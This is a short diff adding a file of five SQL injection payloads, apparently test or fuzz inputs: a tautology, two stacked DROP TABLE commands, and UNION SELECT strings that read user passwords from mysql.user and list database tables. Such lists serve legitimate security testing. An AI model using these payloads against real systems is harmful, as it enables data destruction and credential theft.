@@ -1,0 +1,5 @@
+1 OR 1=1
+test", 100); DROP TABLE items; --
+1; DROP TABLE bills; --
+2000-01-01" UNION SELECT user, password FROM mysql.user; -- 
+%" UNION SELECT 1,table_name,3 FROM information_schema.tables; --
